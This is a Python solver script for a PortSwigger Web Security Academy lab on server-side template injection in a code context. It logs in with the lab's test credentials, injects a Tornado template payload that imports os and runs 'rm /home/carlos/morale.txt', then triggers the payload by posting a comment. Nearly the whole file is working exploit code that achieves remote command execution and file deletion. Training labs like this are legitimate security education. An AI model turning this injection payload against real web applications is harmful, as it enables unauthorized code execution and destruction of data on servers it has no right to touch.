# Basic server-side template injection (code context)

# https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t\t%s' % csrf)
	return csrf

def connect_wiener(s, url):
	print('\n[+] Trying to connect as Wiener user...')
	account_path = url + '/my-account'
	r = s.get(account_path)
	csrf = get_csrf_token(r)
	login_path = url + '/login'
	connect_data = {'csrf': csrf, 'username': 'wiener', 'password': 'peter'}
	r = s.post(login_path, data=connect_data)
	if 'Your username is: wiener' in r.text:
		print('[+] Connected as Wiener user !')
		return r
	return False

def send_payload(s, url, csrf_token):
	account_path = url + '/my-account'
	session = s.cookies.get('session')
	print('[+] Found session cookie:\t%s' % session)
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	inject_path = url + '/my-account/change-blog-post-author-display'
	payload = """user.name}}{%+import+os+%}{{os.system("rm%20/home/carlos/morale.txt")"""
	inject_data = 'blog-post-author-display=' +  payload + '&csrf=' + csrf_token
	print("\n[+] Trying to inject payload '%s' on the target website..." % payload)
	print(f"[+] Sending post request on {inject_path}\n")
	r = s.post(inject_path, data=inject_data, headers=headers)
	time.sleep(1)
	if r.status_code == 200:
		return r
	else:
		if r.status_code == 500 and re.search(b"""<p class=is-warning>(.*)</p>""", r.text.encode()):
			print("[+] %s\'s output:" % url)
			result = re.search(b"""<p class=is-warning>(.*)</p>""", r.text.encode()).group(1)
			print('\t%s' % result.decode())
			return False
		print("[-] Command Injection Failed !!!")


def trigger_payload(s, url):
	print("[+] Trying to post a comment on the target website...")
	comment_path = url + '/post/comment'
	post_path = url + '/post?postId=1'
	r = s.get(post_path)
	if r.status_code == 500 and re.search(b"""<p class=is-warning>(.*)</p>""", r.text.encode()):
		print("[+] %s\'s output:" % url)
		result = re.search(b"""<p class=is-warning>(.*)</p>""", r.text.encode()).group(1)
		print('\t%s' % result.decode())
		return False
	csrf = get_csrf_token(r)
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	comment_data = {'postId': '1', 'comment': 'gwyo', 'csrf': csrf}
	r = s.post(comment_path, data=comment_data, headers=headers)
	print("\n[+] Trying to run the stored payload displaying our name in the comment section...")
	r = s.get(post_path)
	return r


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Basic server-side template injection (code context)')
	parser = argparse.ArgumentParser(description="[+] Lab: Basic server-side template injection (code context)")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send Server-Side Template Injection ...\n')
			time.sleep(1)
			r = connect_wiener(s, url)
			csrf_token = get_csrf_token(r)
			send_payload(s, url, csrf_token)
			time.sleep(2)
			trigger_payload(s, url)
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
